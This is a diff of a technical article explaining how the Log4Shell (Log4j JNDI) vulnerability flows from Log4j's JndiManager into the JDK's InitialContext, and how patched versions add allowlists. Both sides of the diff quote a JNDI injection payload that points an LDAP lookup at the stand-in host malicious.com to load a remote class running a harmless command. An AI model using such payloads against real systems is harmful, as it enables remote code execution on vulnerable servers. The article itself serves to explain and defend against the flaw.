@@ -51,20 +51,20 @@ The `jndi` prefix selects for the JNDI lookup, which brings us into the `JNDIMan
 
 https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java?L162-173
 
-The value of the `name` argument, taken from our attack payload is `ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`. This method sits at the interface between Log4j and JNDI. In Log4j versions 2.14 and prior, it's the pretty dumb passthrough method shown above. In subsequent patched Log4j versions, however, the method has been updated to include sanitization and filtering steps:
+The value of the `String name` argument is `ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`. This method sits at the interface between Log4j and JNDI. In Log4j versions 2.14 and prior, it's the pretty short passthrough method shown above. In subsequent patched Log4j versions, however, the method has been significantly lengthened to include sanitization and filtering steps:
 
 https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8572d1762cd55f051971d91e44f0628908/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java?L221-274
 
-This updated version of the method hints at the specific exploit paths that are now guarded against. Whitelists have been added for allowed hosts, protocols, and class names, with special attention paid to names that use the `ldap://` URL scheme. Indeed, the extra sanitization code would catch our attacker payload and prevent the name from being forwarded to JNDI code.
+This updated version of the method hints at the specific exploit paths that are now guarded against. Whitelists have been added for allowed hosts, protocols, and class names, with special attention paid to names that use the `ldap://` URL scheme. This extra sanitization code would catch our attacker payload and prevent the name from being passed to JNDI.
 
-Why exactly is that `ldap://`-prefixed payload so dangerous if passed directly to `this.context.lookup()`? Let us find out.
+Why exactly is our `ldap://`-prefixed payload so dangerous if passed directly to `this.context.lookup()`? Let us find out.
 
 
 ## Part 2: JNDI
 
-In this part of our journey, we leave the Log4j codebase for the source code for JNDI, which lives in the JDK. [JNDI](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html) is a directory name lookup API that enables named resources to be loaded at runtime. Relevant to our attack, the lookup names can be LDAP URLs and the resources can be Java class files.
+In this part of our journey, we leave the Log4j codebase for the source code for JNDI, in the JDK. [JNDI](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html) is a directory name lookup API that enables named resources to be loaded at runtime. Relevant to our attack, if the lookup names are LDAP URLs, the loadable resources can be Java classes.
 
-From the `this.context.lookup(name)` invocation in Log4j's `JNDIManager`, we jump into `InitialContext`:
+From the `this.context.lookup(name)` invocation in Log4j's `JNDIManager`, we jump into the `InitialContext` class:
 
 https://sourcegraph.com/jdk@65983d0/-/blob/java.naming/javax/naming/InitialContext.java?L408-410
 
